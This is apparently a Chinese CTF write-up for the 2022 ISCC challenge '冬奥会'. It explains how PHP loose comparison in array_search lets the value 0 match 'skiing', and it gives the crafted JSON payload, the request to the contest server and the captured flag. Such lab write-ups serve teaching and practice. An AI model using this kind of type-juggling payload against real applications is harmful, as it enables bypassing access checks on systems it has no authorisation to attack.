---
# 这是页面的图标
icon: token
# 这是文章的标题
title: 2022-ISCC-misc-冬奥会-writeup
# 设置作者
author: lhz
# 设置写作时间
time: 2022-05-24
# 一个页面只能有一个分类
category: CTF
# 一个页面可以有多个标签
tag:
  - writeup
  - CTF

comment: false
---



# 

## 0x01 题目

![image_UNs-rds368](2022_ISCC_web_%E5%86%AC%E5%A5%A5%E4%BC%9A_writeup.assets/image_UNs-rds368.png)

## 0x02 解题思路

打开题目url，可以看到题目的php代码

![image_zJyvh03b-y](2022_ISCC_web_%E5%86%AC%E5%A5%A5%E4%BC%9A_writeup.assets/image_zJyvh03b-y.png)

观察代码，通过get方式接受json格式的参数`Information`,对里面参数进行判断，完全符合要求后显示flag

其中主要代码：

```php
$status = array_search("skiing", $info["items"]);
$status===false?die("Sorry~"):NULL;
foreach($info["items"] as $key=>$val){
    $val==="skiing"?die("Sorry~"):NULL;
}
```

猛然一看这里前后对skiing是否存在判断是矛盾的，推测要使用php的弱类型绕过检查

因为foreach循环里对skiing判断使用的是`===`所以无法绕过，只能再array\_search中绕过

这里参考一篇文章&#x20;

<https://www.cnblogs.com/liangshian/p/10925792.html>

`array_search()`函数中使用的`==`来判断，存在弱类型问题，所以只要传入0，则`0==skiing`返回true

所以根据代码条件

`year`：非数字

`items[1]`:数组

`items`:长度为3，不包含skiing

构建传入参数

```json
Information= {"year":"a2022","items":[0,[1,2,3],"4"]}
```

提交请求

```php
http://59.110.159.206:7060/?Information= {"year":"a2022","items":[0,[1,2,3],"4"]}
```

得到flag： ISCC{AAxQbs2N\_1s1PsQJ9\_as71H8sb8}

![image_k7LYnJA5AI](2022_ISCC_web_%E5%86%AC%E5%A5%A5%E4%BC%9A_writeup.assets/image_k7LYnJA5AI.png)
